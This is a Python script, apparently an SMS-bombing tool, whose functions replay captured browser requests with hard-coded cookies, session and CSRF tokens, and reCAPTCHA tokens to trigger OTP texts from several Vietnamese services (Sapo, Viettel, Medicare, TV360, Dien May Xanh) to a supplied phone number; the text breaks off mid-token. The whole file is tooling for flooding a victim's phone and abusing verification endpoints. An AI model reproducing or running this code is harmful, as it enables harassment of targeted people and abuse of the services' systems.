import requests
import concurrent.futures
import time
import random
import json
import sys
import random
import colorama
from colorama import Fore, Style
def sapo(phone):
    cookies = {
    'landing_page': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    'start_time': '04/30/2025 0:3:46',
    'pageview': '1',
    '_fbp': 'fb.1.1745996626850.500010900568680424',
    'cebs': '1',
    '_ce.clock_data': '162%2C171.236.58.142%2C1%2C33d0f257a817d1ca4c4381b87f8ad83f%2CChrome%2CVN',
    'cebsp_': '1',
    '_ga': 'GA1.1.1902361527.1745996628',
    'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
    '_gcl_au': '1.1.396795918.1745996627.542448179.1745996656.1745996655',
    '_ga_P9DPF3E00F': 'GS1.1.1745996627.1.1.1745996662.25.0.1015646794',
    '_ce.s': 'v~c8242fd185009cf0ae76909196f286bb34849746~lcw~1745996662791~vir~new~lva~1745996627121~vpv~0~v11.cs~200798~v11.s~4318a6a0-2591-11f0-9207-05ed9a5a9231~v11.sla~1745996662801~lcw~1745996662801',
    'lang': 'vi',
    'SESSION': 'ODg3YzM1ZDAtNjg0Ni00NjZiLTliNTUtZTFmYTUwMzYxMzNi',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://accounts.sapo.vn',
    'priority': 'u=1, i',
    'referer': 'https://accounts.sapo.vn/register/confirm?t=DTqKLjXPYqjEcI977s6IwbS6pmwXC6hgAATn&lang=vi',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    # 'cookie': 'landing_page=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; start_time=04/30/2025 0:3:46; pageview=1; _fbp=fb.1.1745996626850.500010900568680424; cebs=1; _ce.clock_data=162%2C171.236.58.142%2C1%2C33d0f257a817d1ca4c4381b87f8ad83f%2CChrome%2CVN; cebsp_=1; _ga=GA1.1.1902361527.1745996628; source=https://www.sapo.vn/dang-nhap-kenh-ban-hang.html; _gcl_au=1.1.396795918.1745996627.542448179.1745996656.1745996655; _ga_P9DPF3E00F=GS1.1.1745996627.1.1.1745996662.25.0.1015646794; _ce.s=v~c8242fd185009cf0ae76909196f286bb34849746~lcw~1745996662791~vir~new~lva~1745996627121~vpv~0~v11.cs~200798~v11.s~4318a6a0-2591-11f0-9207-05ed9a5a9231~v11.sla~1745996662801~lcw~1745996662801; lang=vi; SESSION=ODg3YzM1ZDAtNjg0Ni00NjZiLTliNTUtZTFmYTUwMzYxMzNi',
}

    json_data = {
    'country_code': '84',
    'phone_number': phone,
    'type': 'REQUEST_REGISTER',
    'register_token': 'DTqKLjXPYqjEcI977s6IwbS6pmwXC6hgAATn',
}

    response = requests.post('https://accounts.sapo.vn/otp/get_last', cookies=cookies, headers=headers, json=json_data)
def myviettel(phone):
    cookies = {
    'D1N': '10717d56dc39b28aacde4e4eaaaa944e',
    'laravel_session': 'qGiVEYAgmLS2aGsbnB5lg8dkOIWFSt1G27mHcwRz',
    '_fbp': 'fb.1.1745996830753.779149789119675498',
    '_gcl_au': '1.1.289373337.1745996831',
    '_ga': 'GA1.2.2021564931.1745996831',
    '_gid': 'GA1.2.1803255515.1745996831',
    '_gat_UA-58224545-1': '1',
    'redirectLogin': 'https://viettel.vn/myviettel',
    '__zi': '3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eaeWV-XZ5LDYok2_gR3L4oEOuBnfSLGHumnEG.1',
    '_ga_Z30HDXVFSV': 'GS1.1.1745996831.1.1.1745996840.0.0.0',
    'XSRF-TOKEN': 'eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0%3D',
    '_ga_VH8261689Q': 'GS1.1.1745996831.1.1.1745996843.48.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://viettel.vn',
    'priority': 'u=1, i',
    'referer': 'https://viettel.vn/myviettel',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-csrf-token': 'YmWjtYDADMWpv5nYaFUt0L6EWorIdwuOpOM5q4Gz',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0=',
    # 'cookie': 'D1N=10717d56dc39b28aacde4e4eaaaa944e; laravel_session=qGiVEYAgmLS2aGsbnB5lg8dkOIWFSt1G27mHcwRz; _fbp=fb.1.1745996830753.779149789119675498; _gcl_au=1.1.289373337.1745996831; _ga=GA1.2.2021564931.1745996831; _gid=GA1.2.1803255515.1745996831; _gat_UA-58224545-1=1; redirectLogin=https://viettel.vn/myviettel; __zi=3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1eaeWV-XZ5LDYok2_gR3L4oEOuBnfSLGHumnEG.1; _ga_Z30HDXVFSV=GS1.1.1745996831.1.1.1745996840.0.0.0; XSRF-TOKEN=eyJpdiI6IjFQcTVcL3ZIVzg5cVJ1bElMUUxuM2ZnPT0iLCJ2YWx1ZSI6InJRZ2U5eGdKSUtCbHp4NlZTcE1Ha242WUxCdkpsV1RtNVBMK2wxSlNCUGNweFZDMzYybkNjZjkrN0s0ZU5WTDIiLCJtYWMiOiIzNzhjN2E1NWE0NDkzMDNhYTI3OGMzZGMzN2JmZGNiYTZmMDAzZjcwM2U0Njg0ODE1Zjg3N2QwNzMzNWM0MTczIn0%3D; _ga_VH8261689Q=GS1.1.1745996831.1.1.1745996843.48.0.0',
}

    json_data = {
    'phone': phone,
    'typeCode': 'DI_DONG',
    'actionCode': 'myviettel://login_mobile',
    'type': 'otp_login',
}

    response = requests.post('https://viettel.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
def medicare(phone):
    cookies = {
    'XSRF-TOKEN': 'eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0%3D',
    'medicare_session': 'eyJpdiI6IjNLRUtseUdxV3NSdTV5WDhLcDlpV1E9PSIsInZhbHVlIjoiMzdsNG1lZGtjcWJTUE1TUkhDVmJpYWc1ZU9IeW1LU0tMTUJXMnpZNFRYOU5SQ2RvTUJPSjBGY2g0UldmeS9JQjJlQnZRV3NoSk56S2srTG5mMEFrVTRCUnE5MFU2andxMkozc0dSZGJ6eHFQVGdwbFdpaTBNYk40UXlsNkZVOHQiLCJtYWMiOiJmODY5N2UyZTY4NDc0YmJlYTczMGJkNzU0MDNkZmQ3Y2NlMjgzNTdmOTEzZTY0NDE1OGU0Yzc3N2ZkYWE4YmMwIiwidGFnIjoiIn0%3D',
    'SERVER': 'nginx2',
    '_ga_SSLZMTVB8K': 'GS1.1.1745996950.1.0.1745996950.0.0.0',
    '_ga': 'GA1.1.1761273133.1745996951',
    '_fbp': 'fb.1.1745996951365.718462269982349305',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://medicare.vn',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': 'XSRF-TOKEN=eyJpdiI6InNyVjl6a05hWWVPRGd6bHFvbGZURVE9PSIsInZhbHVlIjoiVEcxMHJsQmk3U0FSQVA0d0h4cnZNY29hTWkyKzVhVEkwRlhGR2JCUFdXZUFmaUhsdGIvODMwVzlmd0lXb3FhTzZzaERTZ3o4dW83UXJMTjhMZ1pwaVUyeS8xQkd6MHFUQmY2eVRTR09ad0lpdGpETXRhVk9idzNSSElueE9ISFEiLCJtYWMiOiJkMzZkNjMwNzlmMGU4NzhlYTQ1NWFiNTU2ZjcwYjgzYmIxMTQyMzg4NTk1YzBhNmUyODdmOTljZGVmNjRiYjIzIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjNLRUtseUdxV3NSdTV5WDhLcDlpV1E9PSIsInZhbHVlIjoiMzdsNG1lZGtjcWJTUE1TUkhDVmJpYWc1ZU9IeW1LU0tMTUJXMnpZNFRYOU5SQ2RvTUJPSjBGY2g0UldmeS9JQjJlQnZRV3NoSk56S2srTG5mMEFrVTRCUnE5MFU2andxMkozc0dSZGJ6eHFQVGdwbFdpaTBNYk40UXlsNkZVOHQiLCJtYWMiOiJmODY5N2UyZTY4NDc0YmJlYTczMGJkNzU0MDNkZmQ3Y2NlMjgzNTdmOTEzZTY0NDE1OGU0Yzc3N2ZkYWE4YmMwIiwidGFnIjoiIn0%3D; SERVER=nginx2; _ga_SSLZMTVB8K=GS1.1.1745996950.1.0.1745996950.0.0.0; _ga=GA1.1.1761273133.1745996951; _fbp=fb.1.1745996951365.718462269982349305',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
    'token': '03AFcWeA7higReiwd6FLyxu9scEOOYIq57D2Zx_5S_uvL-D6nKgMPJWdzQt_s4vgWa0goiXVypMFX20xHMV6WLwS6W6rqVE_dEdOHD6YFoZIi0-hERSLHNRNIx5k2Zvug1Ln-PY16reAMa6gDQixct3xeF4CW3A1saLsGUlT13YHLm5sI2zVj5wvykGTY5rAHAxyxHNHt_6FP_KbeEvQuTqnQRfv2tSbwMOsxhcpPK5HWSNSFEVLDrvvR00WUYgVVouMZpHR099IyC9DSanlmxNAYY-FTTi51s_kg-E4uBQ5ud6OtscYLyw2mcFl-1vvaBcLgA-vxW6VRavHt1ZnH8-p9ycXESJZZfqg3Z61ZSqwJYDUqug8JhAj6EjuoUornMYdi2CEhZSGAUiZUyk6hYuzDgL8GBWqLYm2Jbe0qntLq07Not1dlY4hgfUBKhAk7eYoCghFwKzCgkAo93NB13HFYTHBsuvZq5PgtqL6onq1BljPnH0NGJ-Epwh6NI-w0_hsgZ9SqYqcYQZZdqOI19EeNzlWh7CL7FoP0x8CTWyMrMPVtr8I5gHzRJrkLiQ2TckI_0EPlixh8_LXVzTs89hu_wRT0qX3gCTcqn7hK8m5RGFAoiR47D-itJ1JCXdSSxMmYzCUoFqs0Zhbx7eOjHEeR10DVmVqiNivw8Oyb_bAgZQ1Um6qd7UaVL9EL8MlOwV0MYzja9xNPkEgJgeMhgX5BHAMvuhTDbcSDlRpWGdZ_ythYhjRWu-Cy620bu_NEi3znOYf6uXvd8a9GXBh_f8sK0K2RBLwODAcAvkaXrRbqGziEYmtqRqVp67li-EMbO2FVLD-CaHIqSBGoJaFkgQzMTzs2UAimWJTKnhIIoYHmh7xngGWrakS786jqptVhnyYDw1zt1TNNM3zUuyPC1VG2x789HEulxOvVJjG9L7CSzbU0lL-cAYlKzMOxnUZ3mfCBw9uZdCgZthi55dctjJNiuaBXFFUSo8pwzEOEYs8VYerTVXmzK0sAryMAXP_fOcBmoEzjXhow9mZUKTNtq16ANNCnGjWaKyVCn_jEqqzZtgvajAwTWIwkcYkshzu6khPYXoXk1ErUC4eEe_RmSqMURDksbWBwphh6rkOv5GbTyMuSNAEqnkyMEefisckXTfgThF8PZXzehoNCGQfkbezp4jCPp74kjh_ukNNPCG8CLIfe9hGWvce5x1yS1tQlLHvdn7vtipiCNA-YJDxAoemWr6cXdNayUOVjCtnOZ8BG9TSGDjVP1gMqlSIVNbWk3YbV4v0A4qtnuR_cwkouwy7kCpdcKYTdRh9TXvU_ByEJ6eDMws_SR506X7aaPN7hAG5yhkLseWFaL9TnJm-Hyuq8m1m7se7uPTLAd5OmgBL2q9zThESE3rFUGL2wWkBkTxIekSXU70GOhMxQG4k0KQRnnvz5xBLxSAVXPEhJbjrAlbGws6GTSBnKIVu1ecQ2h2AeQhnxLjapBFDd2N8goNbyvlAPf3xGAhXKXUYycX9ZCQWt2PmdXgUL2INAKxJLIeJsDERG7Rq7SEIGuC5LOwfiaYB0OKl9EfcMwsrtojnSIHykIh0zGMD8-_EA8AINY7o82aGARCRvPQaoIHVf6byTIziNMtKCOoKkljhXIYZkVwf3-eLTXGoaUMi2fSSqY7liZCF09Xn-mFhwiLPiStQ_0U3yWg9M6ArHrjCXK48o9VqcKah8YkHQN7mGYJz5HaoV3pnc74oiSHPFLtVE3dnJKMfgxa_uYiYGNZFKs0jMkQ4J0Aj5xA59885zMaH6SN7S_dskcpOZfx-nAbSD2ByV8iHXE8WZLocUm41MrGfiMEoYSEG3-D0kC4rr9fxskzfnSfy1qzz1fu4CHBElL8yrWN1PAzpAv94uoIOJPpt5OFHvT7iuQnvrKbnboO0xS8s2vLDIci5EUDU2aB4PYYJfaOKGU_pQ3oTEmlkLmdD4aeHicXY6xXFv3Y4r8e7-g1InCXnjKACUVx1sOljxHnmxUBGTgFXwM-7JA_Nyh3n2ldN7m-HDTsfnOw64WB9Fk1RXW77pJR8xG4-Mt3UKy-ESJ_0DFzpFME6riYQPvGdyirjQwTIssRL9AJOHYmGiKPpdZrYiZIBkT',
    'client': 'web',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def tv360(phone):
    cookies = {
    'img-ext': 'avif',
    'NEXT_LOCALE': 'vi',
    'device-id': 's%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o',
    'shared-device-id': 'web_dd1bad97-e5d7-4e26-a742-c6112bac53a2',
    'embed-device-id': 's%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o',
    'screen-size': 's%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo',
    'session-id': 's%3A600e3391-40b7-4139-98d2-cde3dee89d4b.rdii%2BxRHaJNsNurHP9oL7x0bFMjw6MitcUPEY0vxAkg',
    '_ga': 'GA1.2.1353961798.1745997064',
    '_gid': 'GA1.2.686180996.1745997064',
    '_gat_UA-180935206-1': '1',
    'G_ENABLED_IDPS': 'google',
    '_ga_D7L53J0JMS': 'GS1.1.1745997064.1.1.1745997070.54.0.0',
    '_ga_E5YP28Y8EF': 'GS1.1.1745997064.1.1.1745997070.0.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://tv360.vn',
    'priority': 'u=1, i',
    'referer': 'https://tv360.vn/login',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'starttime': '1745997070874',
    'tz': 'America/Los_Angeles',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o; shared-device-id=web_dd1bad97-e5d7-4e26-a742-c6112bac53a2; embed-device-id=s%3Aweb_dd1bad97-e5d7-4e26-a742-c6112bac53a2.9jfQl%2FmMSnEjowUVEwKs%2B6RlGfSQnZAHujqNJUvM19o; screen-size=s%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo; session-id=s%3A600e3391-40b7-4139-98d2-cde3dee89d4b.rdii%2BxRHaJNsNurHP9oL7x0bFMjw6MitcUPEY0vxAkg; _ga=GA1.2.1353961798.1745997064; _gid=GA1.2.686180996.1745997064; _gat_UA-180935206-1=1; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS1.1.1745997064.1.1.1745997070.54.0.0; _ga_E5YP28Y8EF=GS1.1.1745997064.1.1.1745997070.0.0.0',
}

    json_data = {
    'msisdn': phone,
}

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
def dienmayxanh(phone):
    cookies = {
    'TBMCookie_3209819802479625248': '845972001745997151vIjEV+RSYSM8lVpicuLTdOO96us=',
    '___utmvm': '###########',
    '_oauthCDP_WebDMX_Production': '2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQczxQyHvYbPDt5PMcSUc_IHgFec9cvyjymCjcErmg94buomtPIrmg94W1MfrV0nqyvgmiYAJCVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94frmg94a_TW7LIfzqf2MA4NVkheLuQCaS3k6s_1ooKhkFqHr2nuExlxf1u2AcKUazMuIh75kkBpcioZOWDUHB80_ZOk-',
    'mwgngxpv': '3',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8DeM8It-JwlAhxpbhi7u5Q8mNjVWUUQmYHT4gGMPDQvE49zjEOlaYvukJ-uMOAQqII2f8hUivoUGg3F4MOflW-8y7gE1T0xbSzZObsD469dE2vXA4nMcQ8rmd3nhQcUuKddcaNN_Nj0nUN9-V9WpFZQ',
    'DMX_Personal': '%7B%22UID%22%3A%22e6d94a3534afc480fc6ea91ef010a096bb76d1e9%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.1138012301.1745997153',
    '_ga': 'GA1.1.1060106111.1745997153',
    '__uidac': '016811cd611fe7511ea21435c5ee2a96',
    '__admUTMtime': '1745997153',
    '_pk_id.2.8977': '5ebe289a070352aa.1745997153.',
    '_pk_ses.2.8977': '1',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '_fbp': 'fb.1.1745997154121.12996446599693872',
    '__RC': '25',
    '__R': '1',
    '__uif': '__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338',
    'chatmode': '0',
    'SvID': 'new2690|aBHNZ|aBHNY',
    '_ga_Y7SWKJEHCE': 'GS1.1.1745997153.1.1.1745997155.58.0.0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://www.dienmayxanh.com',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': "TBMCookie_3209819802479625248=845972001745997151vIjEV+RSYSM8lVpicuLTdOO96us=; ___utmvm=###########; _oauthCDP_WebDMX_Production=2EICzzDZp6mafDUUPhcXbSxwjvY9BSbQczxQyHvYbPDt5PMcSUc_IHgFec9cvyjymCjcErmg94buomtPIrmg94W1MfrV0nqyvgmiYAJCVs9rmg94SDIynW46h1xqLJAytqg47So3gQSr0Y3OeLrTY2QtrAluYPl2slyiut6YQVQni7kAmkt5OrPyKtWX2QiSEpYHrmg94nl39fnsn5a8mAa1OkcmjrUlScpXrmg94frmg94a_TW7LIfzqf2MA4NVkheLuQCaS3k6s_1ooKhkFqHr2nuExlxf1u2AcKUazMuIh75kkBpcioZOWDUHB80_ZOk-; mwgngxpv=3; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8DeM8It-JwlAhxpbhi7u5Q8mNjVWUUQmYHT4gGMPDQvE49zjEOlaYvukJ-uMOAQqII2f8hUivoUGg3F4MOflW-8y7gE1T0xbSzZObsD469dE2vXA4nMcQ8rmd3nhQcUuKddcaNN_Nj0nUN9-V9WpFZQ; DMX_Personal=%7B%22UID%22%3A%22e6d94a3534afc480fc6ea91ef010a096bb76d1e9%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.1138012301.1745997153; _ga=GA1.1.1060106111.1745997153; __uidac=016811cd611fe7511ea21435c5ee2a96; __admUTMtime=1745997153; _pk_id.2.8977=5ebe289a070352aa.1745997153.; _pk_ses.2.8977=1; __iid=; __iid=; __su=0; __su=0; _fbp=fb.1.1745997154121.12996446599693872; __RC=25; __R=1; __uif=__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338; chatmode=0; SvID=new2690|aBHNZ|aBHNY; _ga_Y7SWKJEHCE=GS1.1.1745997153.1.1.1745997155.58.0.0",
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    'reCaptchaToken': '03AFcWeA5Uym5RH2GPHIv4_E7qAPm5vP5mQtmjHVj88cYM-HNO4RHTcsa6cx20Ph6HCAQiCqIWPkEDOFAtzS77MgB6vbWzHNhzaGAMHD_h8qDw_AAsJuNalhnTS6hqfaD98lhjuzeP2LeGAfSB4w_WUSOftv3RL8apSptqpNOBBfwS_PJWJOzCBuzR6eWgE_j4bvF7hGL5483a5zkMb_6ggdM5IxerEmGwsaB7oIdOY2uPVRyrqsqiV0NLRWfPu0aK6WorWUzHfG_LC6qu0Py0XxpSvmr9NUb5L5lXuiMJXGDOF2ZwySsVQ56KM1DRCjd2FaLq5d8rrQub9ekwCQ3V2_rdjyZF_h4bGCv4fF1w6FiXAF-faHAC8ZBga2a8Pn3rBzrk-zZX_-gTZpn71GOyTsaHd9_OeTvPzZ2a0tTm2PC4vmY_nDyExNilruSZDQuNrOX6jJC9aawLMsFRK1ZcBqKEN6flROJ6X4TH1lZy0-JUG6y1TDI2WMZMqwBB6VPiIQxZBd7qLSake8B-Oc9_C3b78-PWZT9P6y-DfGBw9gIY8KXdQpshQn4EbqiI0UqAnujVRK7CNllj_SK577BAg7lQc_9ouPlx3CCqagummTmnw5PbORcv3EPDqKOE-CR_LZluuheiURNxKfTJo7POtxgt3-0B6Kgp2CBXC4D5sxLiKLYFjB81aWea8DTlMHr8aNzeuGiJ0adF2two3LxXYfxXXVTUIf4P98eE1s1Jh0ISetrkS2HQRnsIsloXYUBgNt71c260PQaZl4kcWlS27cmFLhcsBLqVwa5EsI9LuOq8AqRyOdrZuCHDEIEQhpBem8NfcSIUTDqhCpsS56xuB46b5Pq4kk5xcVB5axZxW